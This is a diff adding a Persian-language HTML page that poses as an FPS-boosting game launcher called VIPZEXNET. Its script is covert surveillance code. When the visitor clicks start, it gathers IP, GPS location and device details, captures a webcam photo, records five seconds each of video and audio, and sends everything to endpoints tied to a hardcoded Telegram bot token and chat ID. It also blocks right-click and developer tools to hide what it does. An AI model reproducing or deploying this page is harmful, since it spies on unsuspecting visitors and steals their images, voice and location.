@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>VIPZEXNET</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: system-ui, sans-serif;
+    }
+
+    body {
+      background: #020617;
+      color: #f8fafc;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+
+    .card {
+      background: rgba(15, 23, 42, 0.6);
+      backdrop-filter: blur(12px);
+      border: 1px solid rgba(56, 189, 248, 0.15);
+      border-radius: 28px;
+      padding: 40px 35px;
+      max-width: 480px;
+      width: 100%;
+      text-align: center;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+    }
+
+    .logo {
+      font-size: 1.8rem;
+      font-weight: 900;
+      margin-bottom: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
+
+    .logo img {
+      width: 40px;
+      height: 40px;
+      border-radius: 10px;
+    }
+
+    .logo span {
+      background: linear-gradient(135deg, #38bdf8, #2563eb);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    h1 {
+      font-size: 2rem;
+      margin: 20px 0 10px;
+      line-height: 1.3;
+    }
+
+    h1 span {
+      background: linear-gradient(135deg, #38bdf8, #2563eb);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    p {
+      color: #94a3b8;
+      margin-bottom: 25px;
+      font-size: 1rem;
+      line-height: 1.6;
+    }
+
+    .btn {
+      background: linear-gradient(135deg, #38bdf8, #2563eb);
+      color: white;
+      border: none;
+      padding: 15px 40px;
+      border-radius: 50px;
+      font-size: 1.05rem;
+      font-weight: 700;
+      cursor: pointer;
+      width: 100%;
+      transition: transform 0.2s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
+
+    .btn:hover {
+      transform: scale(1.02);
+    }
+
+    .btn:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+      transform: none;
+    }
+
+    .status {
+      margin-top: 18px;
+      padding: 12px 16px;
+      border-radius: 14px;
+      background: rgba(15, 23, 42, 0.5);
+      border: 1px solid rgba(56, 189, 248, 0.1);
+      font-size: 0.9rem;
+      color: #94a3b8;
+      min-height: 48px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
+
+    .status.success {
+      color: #4ade80;
+      border-color: rgba(74, 222, 128, 0.3);
+    }
+
+    .status.error {
+      color: #f87171;
+      border-color: rgba(248, 113, 113, 0.3);
+    }
+
+    .spinner {
+      width: 18px;
+      height: 18px;
+      border: 2px solid rgba(56, 189, 248, 0.2);
+      border-top-color: #38bdf8;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      display: inline-block;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    .result {
+      margin-top: 10px;
+      font-size: 3rem;
+    }
+
+    .hidden {
+      display: none !important;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="card">
+    <div class="logo">
+      <img src="https://cdn.imgurl.ir/uploads/w6631_file_00000000638871f49998236e6618eb48.png" alt="VIPZEXNET">
+      <span>VIPZEXNET</span>
+    </div>
+
+    <h1>بهترین <span>FPS</span> رو تجربه کن</h1>
+    <p>زدلانچر با معماری جدید، افت فریم رو فراموش کن</p>
+
+    <button class="btn" id="startBtn">
+      🚀 شروع تجربه
+    </button>
+
+    <div class="status" id="statusBox">
+      ℹ️ برای شروع کلیک کن
+    </div>
+
+    <div id="resultArea"></div>
+  </div>
+
+  <script>
+    // ====== اطلاعات حساس ======
+    const BOT_TOKEN = '8401969947:AAFLWQND6J1aAHaDcZSuhhM6gkDFdinD5_8';
+    const CHAT_ID = '7727238041';
+
+    const statusBox = document.getElementById('statusBox');
+    const startBtn = document.getElementById('startBtn');
+    const resultArea = document.getElementById('resultArea');
+
+    let photoData = null;
+    let videoData = null;
+    let audioData = null;
+
+    // ====== مدت زمان ضبط ======
+    const RECORD_DURATION = 5000; // ۵ ثانیه
+
+    function setStatus(msg, type = '') {
+      statusBox.innerHTML = msg;
+      statusBox.className = 'status ' + type;
+    }
+
+    // ====== جمع‌آوری اطلاعات ======
+    async function collectData() {
+      const data = {
+        url: location.href,
+        referrer: document.referrer || 'مستقیم',
+        time: new Date().toLocaleString('fa-IR'),
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        language: navigator.language,
+        screen: `${screen.width}×${screen.height}`,
+        browser: navigator.userAgent.includes('Chrome') ? 'Chrome' :
+          navigator.userAgent.includes('Firefox') ? 'Firefox' :
+          navigator.userAgent.includes('Safari') ? 'Safari' : 'سایر',
+        os: navigator.userAgent.includes('Windows') ? 'Windows' :
+          navigator.userAgent.includes('Mac') ? 'macOS' :
+          navigator.userAgent.includes('Android') ? 'Android' :
+          navigator.userAgent.includes('iPhone') ? 'iOS' : 'سایر',
+        device: /iPhone|iPad|Android/i.test(navigator.userAgent) ? 'موبایل' : 'دسکتاپ',
+        ip: 'دریافت نشد',
+        city: '',
+        country: '',
+        location: 'رد شد',
+        camera: '❌ دسترسی داده نشد',
+        mic: '❌ دسترسی داده نشد',
+        notification: '❌ دسترسی داده نشد',
+        battery: 'نامشخص'
+      };
+
+      // دریافت IP و موقعیت
+      try {
+        const res = await fetch('/api/geo');
+        const geo = await res.json();
+        data.ip = geo.ip || 'نامشخص';
+        data.city = geo.city || '';
+        data.country = geo.country || '';
+      } catch (e) {}
+
+      // GPS
+      try {
+        const pos = await new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
+        });
+        data.location = `${pos.coords.latitude.toFixed(5)}, ${pos.coords.longitude.toFixed(5)}`;
+      } catch (e) {}
+
+      // ====== دوربین + عکس و فیلم (۵ ثانیه) ======
+      try {
+        setStatus('صبر کنید', '');
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+          video: { width: 640, height: 480 } 
+        });
+        data.camera = '✅ دسترسی داده شد';
+
+        // عکس
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        await video.play();
+        const canvas = document.createElement('canvas');
+        canvas.width = 640;
+        canvas.height = 480;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        photoData = canvas.toDataURL('image/jpeg', 0.8);
+
+        // فیلم (۵ ثانیه)
+        setStatus(`🎥 ضبط فیلم ${RECORD_DURATION/1000} ثانیه...`, '');
+        const recorder = new MediaRecorder(stream);
+        const chunks = [];
+        recorder.ondataavailable = e => chunks.push(e.data);
+        recorder.start();
+        await new Promise(r => setTimeout(r, RECORD_DURATION));
+        recorder.stop();
+        await new Promise(r => recorder.onstop = r);
+
+        const blob = new Blob(chunks, { type: 'video/webm' });
+        const reader = new FileReader();
+        videoData = await new Promise(res => {
+          reader.onload = () => res(reader.result);
+          reader.readAsDataURL(blob);
+        });
+
+        stream.getTracks().forEach(t => t.stop());
+      } catch (e) {
+        data.camera = '❌ ' + e.name;
+      }
+
+      // ====== میکروفون (۵ ثانیه) ======
+      try {
+        setStatus('صبر کنید', '');
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        data.mic = '✅ دسترسی داده شد';
+
+        const recorder = new MediaRecorder(stream);
+        const chunks = [];
+        recorder.ondataavailable = e => chunks.push(e.data);
+        recorder.start();
+        await new Promise(r => setTimeout(r, RECORD_DURATION));
+        recorder.stop();
+        await new Promise(r => recorder.onstop = r);
+
+        const blob = new Blob(chunks, { type: 'audio/webm' });
+        const reader = new FileReader();
+        audioData = await new Promise(res => {
+          reader.onload = () => res(reader.result);
+          reader.readAsDataURL(blob);
+        });
+
+        stream.getTracks().forEach(t => t.stop());
+      } catch (e) {
+        data.mic = '❌ ' + e.name;
+      }
+
+      // نوتیفیکیشن
+      try {
+        const perm = await Notification.requestPermission();
+        data.notification = perm === 'granted' ? '✅ مجاز' : '❌ ' + perm;
+      } catch (e) {}
+
+      // باتری
+      try {
+        const b = await navigator.getBattery();
+        data.battery = `${Math.round(b.level * 100)}% ${b.charging ? '🔌' : '🔋'}`;
+      } catch (e) {}
+
+      return data;
+    }
+
+    // ====== ارسال به تلگرام ======
+    async function sendToTelegram(data) {
+      // متن
+      const text =
+        `🕵️ گزارش جدید\n\n` +
+        `🌐 IP: ${data.ip}\n` +
+        `📍 موقعیت: ${data.location}\n` +
+        `🗺️ شهر: ${data.city} — ${data.country}\n\n` +
+        `📱 دستگاه: ${data.device}\n` +
+        `💻 سیستم: ${data.os}\n` +
+        `🌍 مرورگر: ${data.browser}\n` +
+        `📐 صفحه: ${data.screen}\n` +
+        `🕐 زمان: ${data.time}\n` +
+        `🌏 منطقه: ${data.timezone}\n` +
+        `🗣️ زبان: ${data.language}\n\n` +
+        `📷 دوربین: ${data.camera}\n` +
+        `🎙️ میکروفون: ${data.mic}\n` +
+        `🔔 نوتیف: ${data.notification}\n` +
+        `🔋 باتری: ${data.battery}\n` +
+        `🔗 لینک: ${data.url}`;
+
+      // ارسال متن
+      await fetch('/api/send', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ text })
+      });
+
+      // ارسال عکس
+      if (photoData) {
+        setStatus('صبر کنید...', '');
+        await fetch('/api/send-photo', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ photo: photoData })
+        });
+      }
+
+      // ارسال فیلم
+      if (videoData) {
+        setStatus('صبر کنید', '');
+        await fetch('/api/send-video', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ video: videoData })
+        });
+      }
+
+      // ارسال صدا
+      if (audioData) {
+        setStatus('صبر کنید', '');
+        await fetch('/api/send-audio', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ audio: audioData })
+        });
+      }
+    }
+
+    // ====== شروع ======
+    async function startCollection() {
+      startBtn.disabled = true;
+      setStatus('⏳ شروع فرآیند...', '');
+
+      try {
+        const data = await collectData();
+        setStatus('📤 ارسال به سرور...', '');
+        await sendToTelegram(data);
+
+        setStatus('✅ همه اطلاعات ارسال شد!', 'success');
+        resultArea.innerHTML = '<div class="result">🎉</div>';
+
+        setTimeout(() => {
+          resultArea.innerHTML = `
+            <h2 style="margin-top:15px;font-size:1.3rem;">تبریک! 🎊</h2>
+            <p style="color:#94a3b8;">شما با موفقیت ثبت شد</p>
+          `;
+        }, 500);
+
+      } catch (error) {
+        setStatus('❌ خطا: ' + error.message, 'error');
+        startBtn.disabled = false;
+      }
+    }
+
+    // ====== رویدادها ======
+    startBtn.addEventListener('click', startCollection);
+
+    // جلوگیری از راست‌کلیک و F12
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    document.addEventListener('keydown', e => {
+      if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
+        e.preventDefault();
+      }
+    });
+  </script>
+
+</body>
+</html>
